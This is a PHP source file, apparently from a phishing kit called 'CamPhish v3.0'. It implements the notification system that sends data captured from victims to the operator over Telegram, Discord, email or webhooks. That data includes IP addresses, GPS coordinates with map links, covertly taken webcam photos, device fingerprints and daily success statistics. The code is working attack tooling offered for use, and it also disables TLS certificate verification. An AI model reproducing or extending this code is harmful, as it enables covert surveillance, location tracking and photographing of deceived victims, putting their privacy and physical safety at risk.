<?php
/**
 * CamPhish v3.0 - Notification System
 * Supports Telegram, Discord, Email, and Custom Webhooks
 */

class NotificationManager {
    private $config;
    
    public function __construct($configFile = 'config.json') {
        if (file_exists($configFile)) {
            $this->config = json_decode(file_get_contents($configFile), true);
        } else {
            $this->config = $this->getDefaultConfig();
        }
    }
    
    private function getDefaultConfig() {
        return [
            'telegram' => [
                'enabled' => false,
                'bot_token' => '',
                'chat_id' => ''
            ],
            'discord' => [
                'enabled' => false,
                'webhook_url' => ''
            ],
            'email' => [
                'enabled' => false,
                'smtp_host' => '',
                'smtp_port' => 587,
                'smtp_user' => '',
                'smtp_pass' => '',
                'to' => ''
            ],
            'webhook' => [
                'enabled' => false,
                'url' => '',
                'method' => 'POST',
                'headers' => []
            ]
        ];
    }
    
    /**
     * Send notification about new visit
     */
    public function notifyNewVisit($data) {
        $message = "🔔 *New Visit Detected*\n\n";
        $message .= "📍 *IP Address:* `{$data['ip']}`\n";
        $message .= "🌐 *User Agent:* {$data['user_agent']}\n";
        $message .= "🕐 *Time:* " . date('Y-m-d H:i:s') . "\n";
        
        if (isset($data['referrer'])) {
            $message .= "🔗 *Referrer:* {$data['referrer']}\n";
        }
        
        $this->send($message, 'new_visit', $data);
    }
    
    /**
     * Send notification about captured location
     */
    public function notifyLocation($data) {
        $message = "📍 *GPS Location Captured*\n\n";
        $message .= "🌍 *Coordinates:*\n";
        $message .= "   • Latitude: `{$data['latitude']}`\n";
        $message .= "   • Longitude: `{$data['longitude']}`\n";
        $message .= "   • Accuracy: {$data['accuracy']}m\n\n";
        
        $mapsUrl = "https://www.google.com/maps/search/?api=1&query={$data['latitude']},{$data['longitude']}";
        $message .= "🗺️ [View on Google Maps]($mapsUrl)\n";
        $message .= "🕐 *Time:* " . date('Y-m-d H:i:s') . "\n";
        
        $this->send($message, 'location', $data);
    }
    
    /**
     * Send notification about captured photo
     */
    public function notifyCapture($data) {
        $message = "📸 *Photo Captured*\n\n";
        $message .= "📁 *Filename:* `{$data['filename']}`\n";
        $message .= "💾 *Size:* " . $this->formatBytes($data['size']) . "\n";
        $message .= "🕐 *Time:* " . date('Y-m-d H:i:s') . "\n";
        
        // If file path provided, send with image
        if (isset($data['filepath'])) {
            $this->send($message, 'capture', $data, $data['filepath']);
        } else {
            $this->send($message, 'capture', $data);
        }
    }
    
    /**
     * Send notification about fingerprint
     */
    public function notifyFingerprint($data) {
        $message = "🔍 *Device Fingerprint Collected*\n\n";
        $message .= "🆔 *Fingerprint ID:* `{$data['fingerprint_id']}`\n";
        $message .= "💯 *Confidence:* {$data['confidence']}%\n\n";
        $message .= "📱 *Device Info:*\n";
        $message .= "   • OS: {$data['os']}\n";
        $message .= "   • Browser: {$data['browser']}\n";
        $message .= "   • Screen: {$data['screen_resolution']}\n";
        $message .= "   • GPU: {$data['gpu']}\n";
        $message .= "🕐 *Time:* " . date('Y-m-d H:i:s') . "\n";
        
        $this->send($message, 'fingerprint', $data);
    }
    
    /**
     * Send daily summary
     */
    public function sendDailySummary($stats) {
        $message = "📊 *Daily Summary Report*\n\n";
        $message .= "📅 *Date:* " . date('Y-m-d') . "\n\n";
        $message .= "📈 *Statistics:*\n";
        $message .= "   • Total Visits: {$stats['visits']}\n";
        $message .= "   • Photos Captured: {$stats['captures']}\n";
        $message .= "   • Locations Tracked: {$stats['locations']}\n";
        $message .= "   • Fingerprints: {$stats['fingerprints']}\n";
        $message .= "   • Success Rate: {$stats['success_rate']}%\n\n";
        $message .= "🏆 *Top Sources:*\n";
        
        foreach ($stats['top_sources'] as $source => $count) {
            $message .= "   • $source: $count\n";
        }
        
        $this->send($message, 'summary', $stats);
    }
    
    /**
     * Main send method - dispatches to appropriate channels
     */
    private function send($message, $type, $data = [], $imagePath = null) {
        $results = [];
        
        if ($this->config['telegram']['enabled']) {
            $results['telegram'] = $this->sendTelegram($message, $imagePath);
        }
        
        if ($this->config['discord']['enabled']) {
            $results['discord'] = $this->sendDiscord($message, $data, $imagePath);
        }
        
        if ($this->config['email']['enabled']) {
            $results['email'] = $this->sendEmail($message, $data);
        }
        
        if ($this->config['webhook']['enabled']) {
            $results['webhook'] = $this->sendWebhook($data, $type);
        }
        
        return $results;
    }
    
    /**
     * Send Telegram notification
     */
    private function sendTelegram($message, $imagePath = null) {
        $botToken = $this->config['telegram']['bot_token'];
        $chatId = $this->config['telegram']['chat_id'];
        
        if (empty($botToken) || empty($chatId)) {
            return ['status' => 'error', 'message' => 'Telegram not configured'];
        }
        
        if ($imagePath && file_exists($imagePath)) {
            // Send photo with caption
            $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
            
            $post = [
                'chat_id' => $chatId,
                'caption' => $message,
                'parse_mode' => 'Markdown',
                'photo' => new CURLFile(realpath($imagePath))
            ];
            
        } else {
            // Send text message
            $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
            
            $post = [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'Markdown',
                'disable_web_page_preview' => true
            ];
        }
        
        return $this->curlRequest($url, $post);
    }
    
    /**
     * Send Discord notification
     */
    private function sendDiscord($message, $data, $imagePath = null) {
        $webhookUrl = $this->config['discord']['webhook_url'];
        
        if (empty($webhookUrl)) {
            return ['status' => 'error', 'message' => 'Discord not configured'];
        }
        
        // Convert Markdown to Discord format
        $message = str_replace(['*', '`'], ['**', '`'], $message);
        
        $payload = [
            'username' => 'CamPhish Bot',
            'avatar_url' => 'https://i.imgur.com/4M34hi2.png',
            'embeds' => [[
                'title' => '🔔 CamPhish Alert',
                'description' => $message,
                'color' => 0x667eea,
                'timestamp' => date('c'),
                'footer' => [
                    'text' => 'CamPhish v3.0'
                ]
            ]]
        ];
        
        if ($imagePath && file_exists($imagePath)) {
            // Upload image and include in embed
            $payload['embeds'][0]['image'] = [
                'url' => 'attachment://capture.png'
            ];
            
            // Note: Discord webhooks with files require multipart form data
            // This is simplified - full implementation would handle file upload
        }
        
        return $this->curlRequest($webhookUrl, json_encode($payload), [
            'Content-Type: application/json'
        ]);
    }
    
    /**
     * Send Email notification
     */
    private function sendEmail($message, $data) {
        $config = $this->config['email'];
        
        if (empty($config['smtp_host']) || empty($config['to'])) {
            return ['status' => 'error', 'message' => 'Email not configured'];
        }
        
        // Convert Markdown to HTML
        $htmlMessage = $this->markdownToHtml($message);
        
        $subject = "CamPhish Alert - " . date('Y-m-d H:i:s');
        
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        $headers .= "From: CamPhish <{$config['smtp_user']}>\r\n";
        
        // Use PHPMailer or built-in mail() function
        if (mail($config['to'], $subject, $htmlMessage, $headers)) {
            return ['status' => 'success'];
        } else {
            return ['status' => 'error', 'message' => 'Failed to send email'];
        }
    }
    
    /**
     * Send to custom webhook
     */
    private function sendWebhook($data, $type) {
        $config = $this->config['webhook'];
        
        if (empty($config['url'])) {
            return ['status' => 'error', 'message' => 'Webhook not configured'];
        }
        
        $payload = [
            'type' => $type,
            'data' => $data,
            'timestamp' => time()
        ];
        
        $headers = array_merge(
            ['Content-Type: application/json'],
            $config['headers']
        );
        
        return $this->curlRequest($config['url'], json_encode($payload), $headers);
    }
    
    /**
     * Helper: Make cURL request
     */
    private function curlRequest($url, $postData, $headers = []) {
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode >= 200 && $httpCode < 300) {
            return ['status' => 'success', 'response' => $response];
        } else {
            return ['status' => 'error', 'code' => $httpCode, 'response' => $response];
        }
    }
    
    /**
     * Helper: Format bytes
     */
    private function formatBytes($bytes) {
        $units = ['B', 'KB', 'MB', 'GB'];
        $i = 0;
        while ($bytes >= 1024 && $i < count($units) - 1) {
            $bytes /= 1024;
            $i++;
        }
        return round($bytes, 2) . ' ' . $units[$i];
    }
    
    /**
     * Helper: Convert simple Markdown to HTML
     */
    private function markdownToHtml($markdown) {
        $html = htmlspecialchars($markdown);
        $html = preg_replace('/\*\*(.*?)\*\*/', '<strong>$1</strong>', $html);
        $html = preg_replace('/\*(.*?)\*/', '<em>$1</em>', $html);
        $html = preg_replace('/`(.*?)`/', '<code>$1</code>', $html);
        $html = nl2br($html);
        
        $html = "
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
                code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
                strong { color: #667eea; }
            </style>
        </head>
        <body>$html</body>
        </html>
        ";
        
        return $html;
    }
}

// Example usage
if (basename(__FILE__) == basename($_SERVER['PHP_SELF'])) {
    $notifier = new NotificationManager();
    
    // Test notification
    $notifier->notifyNewVisit([
        'ip' => '192.168.1.100',
        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
        'referrer' => 'https://google.com'
    ]);
}
?>